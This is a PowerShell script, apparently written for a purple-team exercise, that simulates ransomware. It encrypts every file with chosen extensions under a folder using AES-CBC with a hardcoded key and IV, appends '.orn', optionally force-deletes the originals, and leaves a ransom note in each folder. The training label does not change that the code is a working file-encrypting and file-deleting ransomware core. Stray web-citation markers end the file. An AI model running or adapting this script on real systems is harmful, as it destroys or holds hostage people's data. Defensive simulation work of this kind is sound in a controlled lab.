param(
    [Parameter(Mandatory=$true)]
    [string]$Path,
    
    [Parameter(Mandatory=$true)]
    [string[]]$Extensions,
    
    [switch]$Recurse,
    
    [switch]$Delete
)

# Hardcoded key and IV - Purple1234567890 (32 chars for AES-256)
$KeyString = "Purple1234567890Purple1234567890Purple1234567890Pu"
$IVString = "Purple1234567890Purple"
$Key = [System.Text.Encoding]::UTF8.GetBytes($KeyString.Substring(0,32))
$IV = [System.Text.Encoding]::UTF8.GetBytes($IVString.Substring(0,16))

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $Key
$aes.IV = $IV
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$encryptor = $aes.CreateEncryptor()

# Ransom note template
$RansomNote = @"
=====================================
       PURPLE TEAM SIMULATION
=====================================
Your files have been ENCRYPTED for 
PURPLE TEAM TRAINING PURPOSES ONLY.

This is a CONTROLLED ransomware simulation.
No real data was compromised.

Key used: Purple1234567890 (AES-256-CBC)

To decrypt in lab:
Use matching PowerShell decryptor with same key/IV

Contact: Purple Team Exercise Coordinator
Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm')
=====================================
"@

# Track folders processed for ransom notes
$foldersProcessed = @{}

# Find matching files
$files = Get-ChildItem -Path $Path -Recurse:$Recurse -File | 
         Where-Object { $Extensions -contains $_.Extension.TrimStart('.') }

$processed = 0
foreach ($file in $files) {
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
        $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)
        
        $encryptedPath = $file.FullName + ".orn"
        [System.IO.File]::WriteAllBytes($encryptedPath, $encryptedBytes)
        
        # Create ransom note in parent directory if not exists
        $parentDir = $file.Directory.FullName
        $ransomNotePath = Join-Path $parentDir "PURPLE_TEAM_RANSOM_NOTE.txt"
        if (-not $foldersProcessed.ContainsKey($parentDir) -and -not (Test-Path $ransomNotePath)) {
            $RansomNote | Out-File -FilePath $ransomNotePath -Encoding UTF8
            $foldersProcessed[$parentDir] = $true
            Write-Host "Ransom note created: $ransomNotePath" -ForegroundColor Yellow
        }
        
        if ($Delete) {
            Remove-Item $file.FullName -Force
            Write-Host "Encrypted & DELETED: $($file.Name) -> $encryptedPath" -ForegroundColor Red
        } else {
            Write-Host "Encrypted: $($file.Name) -> $encryptedPath"
        }
        $processed++
    }
    catch {
        Write-Warning "Failed to encrypt $($file.Name): $_"
    }
}

$aes.Dispose()
Write-Host "Purple Team Simulation complete!" -ForegroundColor Green
Write-Host "Processed $processed files across $($foldersProcessed.Count) folders with ransom notes." -ForegroundColor Green [web:1][web:8][web:24]
